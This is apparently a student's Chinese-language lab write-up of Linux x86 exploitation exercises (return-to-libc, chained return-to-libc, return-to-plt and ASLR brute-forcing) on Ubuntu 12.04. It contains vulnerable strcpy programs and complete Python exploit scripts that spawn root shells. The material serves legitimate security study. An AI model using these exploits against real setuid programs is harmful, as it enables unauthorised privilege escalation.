<h1 id="实验四使用-return-to-libc-绕过-nx-位"><a class="markdownIt-Anchor" href="#实验四使用-return-to-libc-绕过-nx-位"></a> 实验四：使用 return-to-libc 绕过 NX 位</h1>
<p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p>
<p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p>
<h2 id="1-原理-3"><a class="markdownIt-Anchor" href="#1-原理-3"></a> 1． 原理</h2>
<p>在以前的帖子中，我们看到了这个攻击者复制shellcode堆栈并跳转到它！ 为了成功利用漏洞代码。为了阻止攻击者的行动，安全研究人员提出了一个名 为“NX 位”的漏洞缓解！</p>
<p><strong>什么是NX 位？</strong></p>
<p>它是一种利用缓解技术，使某些内存区域不可执行，并使可执行区域不可写。示 例：使数据，堆栈和堆段不可执行，而代码段不可写。 在NX 位打开的情况下，我们基于堆栈的缓冲区溢出的经典方法将无法利用此漏洞。因为在经典的方法中，shellcode被复制到堆栈中，返回地址指向shellcode。 但是现在由于堆栈不再可执行，我们的漏洞利用失败！</p>
<p>漏洞代码：此代码与以前发布的漏洞代码相同，稍作修改。稍后我会谈谈需要修改的内容。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>]; <span class="hljs-comment">/* [1] */</span><br><span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]); <span class="hljs-comment">/* [2] */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,buf); <span class="hljs-comment">/* [3] */</span><br>fflush(<span class="hljs-built_in">stdout</span>); <span class="hljs-comment">/* [4] */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure>
<h2 id="2编译以及溢出点"><a class="markdownIt-Anchor" href="#2编译以及溢出点"></a> 2.编译以及溢出点</h2>
<p>以下是编译过程，没有添加-z execstack的参数进行编译，说明现在堆栈是不可执行的</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730172751113.png" alt="image-20210730172751113" style="zoom:80%;">                      
<p>这时可以看到堆栈段只包含读写，不能执行</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173004437.png" alt="image-20210730173004437" style="zoom:80%;">
<p>如何绕过NX位并实现任意代码执行？</p>
<p>可以使用叫做“return-to-libc”的攻击技术绕过NX 位。这里返回地址被一个特定的 libc函数地址覆盖（而不是包含shellcode的堆栈地址）。例如，如果攻击者想要生成一个shell，那么他将使用 system 地址覆盖返回地址，并在堆栈中设置 system 所需的相应参数，以便成功调用它。</p>
<p>首先我们得找到system等地址</p>
<p>通过调试可以找到</p>
<p><strong>system地址为0xb7e5f460</strong></p>
<p><strong>Exit地址为0xb7e52fe0</strong></p>
<p><strong>/bin/sh地址为0xb7f81ff8</strong></p>
<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173054568.png" alt="image-20210730173054568" style="zoom:80%;">
<h2 id="3-构建exp攻击"><a class="markdownIt-Anchor" href="#3-构建exp攻击"></a> 3. 构建exp攻击</h2>
<p>有了上述条件，我们可以构建这样的exp</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#exp.py</span><br>#!/usr/bin/env python<br><span class="hljs-keyword">import</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class"><span class="hljs-title">from</span> <span class="hljs-title">subprocess</span> <span class="hljs-title">import</span> <span class="hljs-title">call</span></span><br><span class="hljs-class"><span class="hljs-title">system</span> =</span>  <span class="hljs-number">0xb7e5f460</span> <br><span class="hljs-built_in">exit</span> = <span class="hljs-number">0xb7e52fe0</span> <br>binsh_arg = <span class="hljs-number">0xb7f81ff8</span><br><span class="hljs-meta">#endianess conversion</span><br>def conv(num):<br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<span class="hljs-meta">#system + exit + system_arg</span><br>buf = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">268</span><br>buf += conv(system)<br>buf += conv(<span class="hljs-built_in">exit</span>)<br>buf += conv(binsh_arg)<br>print bu	f<br>print <span class="hljs-string">&quot;Calling vulnerable program&quot;</span><br>call([<span class="hljs-string">&quot;./vuln&quot;</span>, buf])<br><br></code></pre></td></tr></table></figure>
<p>测试成功拿到rootshell</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173210271.png" alt="image-20210730173210271" style="zoom:80%;">
<h1 id="实验五使用链式-return-to-libc-绕过-nx-位未成功"><a class="markdownIt-Anchor" href="#实验五使用链式-return-to-libc-绕过-nx-位未成功"></a> 实验五：使用链式 return-to-libc 绕过 NX 位（未成功）</h1>
<p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p>
<p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p>
<h2 id="1原理"><a class="markdownIt-Anchor" href="#1原理"></a> 1.原理</h2>
<p><strong>漏洞代码：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br>seteuid(getuid()); <span class="hljs-comment">/* Temporarily drop privileges */</span><br><span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buf);<br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
<p><strong>什么是最小权限原则？</strong></p>
<p>此技术允许root setuid程序仅在需要时获取root权限。这指的是当需要时，获得root 权限，当不需要它们时，它将丢弃获得的root权限。正常做法是root setuid程序之 后，用户获取输入之前删除root权限。因此，即使用户输入是恶意的，攻击者也不 会得到root shell。例如下面的漏洞代码不允许攻击者获取root shell。</p>
<p>如上所述，链接 setuid ， system 和 exit 将允许我们能够利用漏洞 代码 vuln 。但由于以下两个问题，不是一个直接的任务：</p>
<p>1、在堆栈中的同一位置，攻击者将需要放置libc函数的函数参数或一个libc函数的 函数参数和另一个libc函数的地址，这显然是不可能的（如下图所示）。 2、 seteuid_arg 应为零，但是strcpy遇到\00会结束输入，所以我们得找到一个字符串0的地址来避免这个问题</p>
<p>调用以下libc函数（按照列出的顺序）</p>
<p>seteuid(0)</p>
<p>system(“sh”)</p>
<p>exit()</p>
<p>构建rop链就可以获得root shell。</p>
<h2 id="2攻击思路"><a class="markdownIt-Anchor" href="#2攻击思路"></a> 2.攻击思路</h2>
<p>通过leave ret构建假栈帧，执行我们的rop链，因为strcpy函数会对\x00进行截断，我们要构建setuid（0）这个rop链接，只能通过4个sprintf函数把4个\x00拷到栈上。</p>
<p>Leave ret 这个指令汇编是</p>
<p><strong>mov esp ebp</strong></p>
<p><strong>pop ebp</strong></p>
<p><strong>pop eip</strong></p>
<p>通过这几个指令可以把我们伪造的fake_ebp变成下一个栈的栈底，然后执行fake_ebp+4位置的指令，从而可以按顺序执行我们构造的rop链。</p>
<p>我们需要构造4个sprintf函数把\x00拷贝到setuid()函数的参数位置，然后继续构建fake_ebp执行setuid()，system(/bin/sh)就可以拿到rootshell</p>
<p>编译完成后，查看mian函数的堆栈</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173554156.png" alt="image-20210730173554156" style="zoom:80%;">         
<p>尝试输入268个A和4个B</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173611629.png" alt="image-20210730173611629" style="zoom:80%;">
<p>可以知道eip的位置还是之前的268个A的后面4位</p>
<p>题目原理是伪造栈，进行栈迁移，然后把0复制到栈上进行操作，但是我实际操作时遇到了诸多问题</p>
<ol>
<li>
<p>题目中strcpy函数不可以用，但是在我使用的libc上是可用的，可以通过strcpy把libc上strcpy函数的地址复制到栈上，所以题目中用了sprintf函数</p>
</li>
<li>
<p>但是实际上在我使用sprintf函数时，它的地址会被截断，无法使用</p>
<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173658115.png" alt="image-20210730173658115" style="zoom:80%;">
</li>
</ol>
<p>这里我sprintf函数的地址是0xb7e6b920，会导致这个函数之后的rop链接复制不了</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173712364.png" alt="image-20210730173712364" style="zoom:80%;">
<ol start="3">
<li>实际上我也使用其他乌班图尝试了一下，但是sprintf函数并不能把字符复制到栈上，如下，这里rop链可以执行，但是并不能复制到栈上，我也不知道为什么</li>
</ol>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173731850.png" alt="image-20210730173731850" style="zoom:80%;">
<p>这是sprintf的3个参数设定，经过调试知道题中是把0xbffff23c地址的00复制到0xbffff210，0xbffff23c的位置是strcpy截断的\00的位置</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173811988.png" alt="image-20210730173811988" style="zoom:80%;">
<p>实际上这里rop链在sprintf函数中就会突然跳转到一个错误地址然后停止，</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173833967.png" alt="image-20210730173833967" style="zoom:80%;">
<p><strong>基于以上原因，我只能借用了同学的一个可以完成此实验的环境进行调试</strong></p>
<p>这里的sprintf函数地址是0xb7e6cf80，不会被strcpy截断</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173851194.png" alt="image-20210730173851194" style="zoom:80%;">
<p>/bin/sh的地址是0xb7f81ff8</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173912815.png" alt="image-20210730173912815" style="zoom:80%;">
<p>我们构建的栈空间应该是这样的</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730173936029.png" alt="image-20210730173936029" style="zoom:80%;">
<p>把构造的exp输入栈后，栈空间是这样的，需要把0xbffff274位置的\x00复制到0xbffff250位置，复制4次，每次加1</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730174002589.png" alt="image-20210730174002589" style="zoom:80%;">
<p>Payload脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct <br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call <br>fake_ebp0 = <span class="hljs-number">0xbffff1e0</span><br>fake_ebp1 = <span class="hljs-number">0xbffff1f8</span> <br>fake_ebp2 = <span class="hljs-number">0xbffff210</span> <br>fake_ebp3 = <span class="hljs-number">0xbffff228</span> <br>fake_ebp4 = <span class="hljs-number">0xbffff244</span> <br>fake_ebp5 = <span class="hljs-number">0xbffff254</span> <br>fake_ebp6 = <span class="hljs-number">0xbffff264</span> <br>fake_ebp7 = <span class="hljs-number">0xbffff274</span> <br>leave_ret = <span class="hljs-number">0x0804851c</span> <br>sprintf_addr = <span class="hljs-number">0xb7e6cf80</span> <br>seteuid_addr = <span class="hljs-number">0xb7f08970</span><br>system_addr = <span class="hljs-number">0xb7e5f460</span> <br>exit_addr = <span class="hljs-number">0xb7e52fe0</span> <br>sprintf_arg1 = <span class="hljs-number">0xbffff250</span> <br>sprintf_arg2 = <span class="hljs-number">0x80485f0</span> <br>sprintf_arg3 = <span class="hljs-number">0xbffff274</span><br>binsh_arg = <span class="hljs-number">0xb7f81ff8</span><br>exit_arg = <span class="hljs-number">0xffffffff</span> <br><span class="hljs-comment">#endianess convertion </span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">conv</span>(<span class="hljs-params">num</span>):</span> <br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<br>buf=<span class="hljs-string">&quot;A&quot;</span>* <span class="hljs-number">264</span><br>buf += conv(fake_ebp0) <br>buf += conv(leave_ret) <br><span class="hljs-comment">#Below four stack frames are for sprintf (to setup seteuid arg ) </span><br>buf += conv(fake_ebp1) <br>buf += conv(sprintf_addr) <br>buf += conv(leave_ret) <br>buf += conv(sprintf_arg1) <br>buf += conv(sprintf_arg2) <br>buf += conv(sprintf_arg3) <br>buf += conv(fake_ebp2) <br>buf += conv(sprintf_addr) <br>buf += conv(leave_ret)<br>sprintf_arg1 += <span class="hljs-number">1</span> <br>buf += conv(sprintf_arg1) <br>buf += conv(sprintf_arg2) <br>buf += conv(sprintf_arg3) <br>buf += conv(fake_ebp3) <br>buf += conv(sprintf_addr) <br>buf += conv(leave_ret) <br>sprintf_arg1 += <span class="hljs-number">1</span> <br>buf += conv(sprintf_arg1) <br>buf += conv(sprintf_arg2) <br>buf += conv(sprintf_arg3) <br>buf += conv(fake_ebp4) <br>buf += conv(sprintf_addr) <br>buf += conv(leave_ret) <br>sprintf_arg1 += <span class="hljs-number">1</span> <br>buf += conv(sprintf_arg1) <br>buf += conv(sprintf_arg2) <br>buf += conv(sprintf_arg3) <br><span class="hljs-comment">#Dummy - To avoid null byte in fake_ebp4. </span><br>buf += <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">4</span> <br><span class="hljs-comment">#Below stack frame is for seteuid </span><br>buf += conv(fake_ebp5) <br>buf += conv(seteuid_addr) <br>buf += conv(leave_ret) <br><span class="hljs-comment">#Dummy - This arg is zero&#x27;d by above four sprintf calls </span><br>buf += <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">4</span> <br><span class="hljs-comment">#Below stack frame is for system </span><br>buf += conv(fake_ebp6) <br>buf += conv(system_addr) <br>buf += conv(leave_ret) <br>buf += conv(binsh_arg) <br><span class="hljs-comment">#Below stack frame is for exit </span><br>buf += conv(fake_ebp7) <br>buf += conv(exit_addr) <br>buf += conv(leave_ret) <br>buf += conv(exit_arg) <br><span class="hljs-built_in">print</span> buf <br><span class="hljs-comment">#print &quot;Calling vulnerable program&quot; </span><br><span class="hljs-comment">#call([&quot;./vuln&quot;, buf])</span><br></code></pre></td></tr></table></figure>
<h1 id="实验六绕过aslr-第一部分"><a class="markdownIt-Anchor" href="#实验六绕过aslr-第一部分"></a> 实验六：绕过ASLR – 第一部分</h1>
<p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p>
<p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p>
<h2 id="1原理书中内容"><a class="markdownIt-Anchor" href="#1原理书中内容"></a> 1．原理（书中内容）</h2>
<p>什么是 ASLR?</p>
<p>地址空间布局随机化（ASLR）是随机化的利用缓解技术: 堆栈地址 堆地址 共享库地址 一旦上述地址被随机化，特别是当共享库地址被随机化时，我们采取的绕过NX 位的方法不会生效，因为攻击者需要知道libc基地址。但这种缓解技术并不完全是万无一失的。</p>
<p>libc函数地址计算如下：</p>
<p>libc函数地址 = libc 基址 + 函数偏移</p>
<p><strong>什么是return-to-plt?</strong></p>
<p>在这种技术中，而不是返回到libc函数（其地址是随机的）攻击者返回到一个函数的PLT（其地址不是随机的-其地址在执行之前已知）。由于 function@PLT 不是随机的，所以攻击者不再需要预测libc的基地址，而是可以简单地返回到 function@PLT 来调用 function 。</p>
<p><strong>什么是PLT</strong>**，如何通过调用 function@PLT** <strong>来调用“函数”？</strong></p>
<p>要了解过程链接表（PLT），先让我简要介绍一下共享库！</p>
<p>与静态库不同，共享库代码段在多个进程之间共享，而其数据段对于每个进程是唯一的。这有助于减少内存和磁盘空间。由于代码段在多个进程之间共享，所以应该只有 read 和 execute 权限，因此动态链接器不能重新定位代码段中存在的数据符号或函数地址（因为它没有写权限）。那么动态链接如何在运行时重新定位共享库符号而不修改其代码段?它使用PIC完成！</p>
<p><strong>什么是PIC</strong>**？**</p>
<p>位置无关代码（PIC）是为了解决这个问题而开发的 - 它确保共享库代码段在多个 进程之间共享，尽管在加载时执行重定位。PIC通过一级间接寻址实现这一点-共享 库代码段不包含绝对虚拟地址来代替全局符号和函数引用，而是指向数据段中的特定表。该表是全局符号和函数绝对虚拟地址的占位符。动态链接器作为重定位的一部分来填充此表。因此，只有重定位数据段被修改，代码段保持不变！ 动态链接器以两种不同的方式重新定位PIC中发现的全局符号和函数，如下所述：</p>
<p><strong>全局偏移表（GOT</strong>**）**： 全局偏移表包含每个全局变量的4字节条目，其中4字节条目包含全局变量的地址。 当代码段中的指令引用全局变量时，而不是全局变量的绝对虚拟地址，指令指向 GOT中条目。当加载共享库时，GOT条目由动态链接器重新定位。因此，PIC使用 该表来重新定位具有单个间接级别的全局符号。</p>
<p><strong>过程链接表（PLT</strong>**）**： 过程链接表包含每个全局函数的存根代码。代码段中的调用 指令不直接调用函数（ function ），而是调用存根代码 （ function @ PLT ）。这个存根代码在动态链接器的帮助下解析了函数地址并将其复制到GOT（ GOT [n] ）。这次解析仅在函数（ function ）的第一次调用 期间发生，稍后当代码段中的调用指令调用存根代码（ function @PLT ）时，而</p>
<p>不是调用动态链接器来解析函数地址（ function ）存根代码直接从 GOT（ GOT [n] ）获取功能地址并跳转到它。因此，PIC使用这个表来重新定位 具有两级间接的功能地址。</p>
<p>漏洞代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-comment">/* Eventhough shell() function isnt invoked directly, its needed</span><br><span class="hljs-comment">here since &#x27;system@PLT&#x27; and &#x27;exit@PLT&#x27; stub code should be pres</span><br><span class="hljs-comment">ent in executable to successfully exploit it. */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shell</span><span class="hljs-params">()</span> </span>&#123;<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br><span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,buf);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
<h2 id="2漏洞利用"><a class="markdownIt-Anchor" href="#2漏洞利用"></a> 2.漏洞利用</h2>
<p>首先反汇编查看程序</p>
<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102132605.png" alt="image-20210802102132605" style="zoom:80%;">         
<p>这样可以看到system和exit的地址</p>
<p>然后使用ida查看‘bin/sh’的地址为0x0804850</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102157354.png" alt="image-20210802102157354" style="zoom:80%;">
<p>构建exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#exp.py</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call<br>system = <span class="hljs-number">0x8048380</span><br>exit = <span class="hljs-number">0x80483a0</span><br>binsh = <span class="hljs-number">0x080485B0</span> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">conv</span>(<span class="hljs-params">num</span>):</span><br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<span class="hljs-comment">#system + exit + system_arg</span><br>buf = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">272</span><br>buf += conv(system)<br>buf += conv(exit)<br>buf += conv(binsh)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Calling vulnerable program&quot;</span><br>call([<span class="hljs-string">&quot;./vuln&quot;</span>, buf])<br><br></code></pre></td></tr></table></figure>
<p>成功得到rootshell</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102245437.png" alt="image-20210802102245437" style="zoom:80%;">
<h1 id="实验七绕过-aslr-第二部分"><a class="markdownIt-Anchor" href="#实验七绕过-aslr-第二部分"></a> 实验七：绕过 ASLR – 第二部分</h1>
<p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p>
<p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p>
<h2 id="1-原理-4"><a class="markdownIt-Anchor" href="#1-原理-4"></a> 1． 原理</h2>
<p>漏洞代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br><span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,buf);<br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>编译过程：</p>
<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102403136.png" alt="image-20210802102403136" style="zoom:80%;">
<p>验证当随机化打开时不同的 Libc 基址：</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102421800.png" alt="image-20210802102421800" style="zoom:80%;">
<p>可以看到，Libc 随机化仅限于3个十六进制位。而且前面只有0xb75和0xb76因此我们可以在最多 256 x2次尝试内，得到 root shell。</p>
<p>所以编写一个循环爆破脚本。</p>
<h2 id="2找到地址构建exp"><a class="markdownIt-Anchor" href="#2找到地址构建exp"></a> 2.找到地址，构建exp</h2>
<p>我们先用指令寻找system以及exit的偏移地址</p>
<p>输入readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit</p>
<p>所以exit的偏移地址是0x00032fe0</p>
<p>输入readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102441989.png" alt="image-20210802102441989" style="zoom:80%;">
<p>得到system的偏移地址0x0003f460</p>
<p>输入strings -a -t x /lib/i386-linux-gnu/libc.so.6 |grep “/bin/sh”</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102457948.png" alt="image-20210802102457948" style="zoom:80%;">
<p>得到/bin/sh的偏移地址是0x161ff8</p>
<p>我们选择一个libc基址为0xb7525000进行爆破</p>
<p>*这里由于自己找到的/bin/sh基址使用会报错，不知道为啥解决不了，只好使用报告里的/bin/sh地址</p>
<p>构建exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment">#exp.py</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call<br>libc_base_addr = <span class="hljs-number">0xb7525000</span>   <span class="hljs-comment">#猜测的libc基址</span><br>exit_off = <span class="hljs-number">0x00032fe0</span>    <span class="hljs-comment">#exit偏移</span><br>system_off = <span class="hljs-number">0x0003f460</span>   <span class="hljs-comment">#system偏移</span><br>system_addr = libc_base_addr + system_off<br>exit_addr = libc_base_addr + exit_off<br>binsh = <span class="hljs-number">0x804827d</span>  <span class="hljs-comment">#bin/sh地址</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">conv</span>(<span class="hljs-params">num</span>):</span><br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<span class="hljs-comment">#system + exit + system_arg</span><br>buf = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">268</span><br>buf += conv(system_addr)<br>buf += conv(exit_addr)<br>buf += conv(binsh)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Calling vulnerable program&quot;</span><br><span class="hljs-comment">#Multiple tries until we get lucky</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">512</span>):<br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Number of tries: %d&quot;</span> %i<br>  i += <span class="hljs-number">1</span><br>  ret = call([<span class="hljs-string">&quot;./vuln&quot;</span>, buf])<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> ret):<br>   <span class="hljs-keyword">break</span><br>  <span class="hljs-keyword">else</span>:<br>   <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Exploit failed&quot;</span><br><br></code></pre></td></tr></table></figure>
<p>如下，循环到365时成功爆破得到rootshell</p>
